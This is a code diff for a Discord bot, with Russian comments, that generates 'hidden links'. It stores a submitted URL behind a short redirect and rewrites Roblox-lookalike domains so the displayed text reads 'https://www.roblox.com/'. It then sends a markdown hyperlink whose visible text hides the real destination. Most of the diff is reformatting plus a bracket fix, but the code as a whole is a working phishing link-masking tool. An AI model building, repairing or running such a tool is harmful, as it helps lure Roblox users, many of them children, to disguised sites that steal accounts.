@@ -1,19 +1,19 @@
 require('dotenv').config();
-const { 
-  Client, 
-  GatewayIntentBits, 
-  ActionRowBuilder, 
-  ModalBuilder, 
-  TextInputBuilder, 
-  TextInputStyle, 
-  MessageFlags 
+const {
+  Client,
+  GatewayIntentBits,
+  ActionRowBuilder,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle,
+  MessageFlags
 } = require('discord.js');
 
 const express = require('express');
 const app = express();
 
-const client = new Client({ 
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
+const client = new Client({
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
 const linksDb = {};
@@ -63,67 +63,66 @@ client.on('interactionCreate', async (interaction) => {
     } catch (error) {
       console.error(`❌ [${Date.now() - startTime}ms] Error showing modal:`, error.message);
       if (!interaction.replied && !interaction.deferred) {
-        await interaction.reply({ 
-          content: '❌ Не удалось открыть форму. Попробуй ещё раз.', 
-          flags: [MessageFlags.Ephemeral] 
+        await interaction.reply({
+          content: '❌ Не удалось открыть форму. Попробуй ещё раз.',
+          flags: [MessageFlags.Ephemeral]
         }).catch(() => {});
       }
     }
     return;
   }
 
-// ==================== МОДАЛКА ====================
-if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
-  console.log(`📝 Modal submitted by ${interaction.user.tag}`);
+  // ==================== МОДАЛКА ====================
+  if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
+    console.log(`📝 Modal submitted by ${interaction.user.tag}`);
 
-  try {
-    const url = interaction.fields.getTextInputValue('url_input');
-    const id = Math.random().toString(36).substring(7);
-    linksDb[id] = url;
-
-    const shortUrl = `${process.env.BASE_URL}/r/${id}`;
-    
-    const visualUrl = url
-      .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
-      .replace('https://', 'https_:_//');
-
-    // Ответ в канале
-    await interaction.reply({ 
-      content: '<a:verify:1513286049638518824> Check your DMs!', 
-      flags: [MessageFlags.Ephemeral] 
-    });
-
-    // Отправка в ЛС
     try {
-      // Первое сообщение — заголовок
-      await interaction.user.send({
-        embeds: [{
-          color: 0x274666,
-          title: '🔗 Hyperlink Generated',
-          description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
-        }]
-      });
+      const url = interaction.fields.getTextInputValue('url_input');
+      const id = Math.random().toString(36).substring(7);
+      linksDb[id] = url;
 
-      // Второе сообщение — ссылка в кодовом блоке
-      await interaction.user.send({
-        content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
-      });
+      const shortUrl = `${process.env.BASE_URL}/r/${id}`;
+      
+      const visualUrl = url
+        .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
+        .replace('https://', 'https_:_//');
 
-      console.log(`✅ Link sent to DM for ${interaction.user.tag}`);
-    } catch (dmError) {
-      console.error('DM error:', dmError.message);
-      await interaction.followUp({
-        content: `⚠️ Не удалось отправить в ЛС.\nВот твоя ссылка:\n[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``,
+      // Ответ в канале
+      await interaction.reply({
+        content: '<a:verify:1513286049638518824> Check your DMs!',
         flags: [MessageFlags.Ephemeral]
       });
-    }
 
-  } catch (error) {
-    console.error('Modal processing error:', error);
-    await interaction.reply({ 
-      content: '❌ Произошла ошибка при обработке ссылки.', 
-      flags: [MessageFlags.Ephemeral] 
-    }).catch(() => {});
+      // Отправка в ЛС
+      try {
+        await interaction.user.send({
+          embeds: [{
+            color: 0x274666,
+            title: '🔗 Hyperlink Generated',
+            description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
+          }]
+        });
+
+        await interaction.user.send({
+          content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
+        });
+
+        console.log(`✅ Link sent to DM for ${interaction.user.tag}`);
+      } catch (dmError) {
+        console.error('DM error:', dmError.message);
+        await interaction.followUp({
+          content: `⚠️ Не удалось отправить в ЛС.\nВот твоя ссылка:\n[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``,
+          flags: [MessageFlags.Ephemeral]
+        });
+      }
+    } catch (error) {
+      console.error('Modal processing error:', error);
+      await interaction.reply({
+        content: '❌ Произошла ошибка при обработке ссылки.',
+        flags: [MessageFlags.Ephemeral]
+      }).catch(() => {});
+    }
   }
-}
+}); // ←←← Вот эта закрывающая скобка была пропущена!
+
 client.login(process.env.TOKEN).catch(err => console.error('Login error:', err));
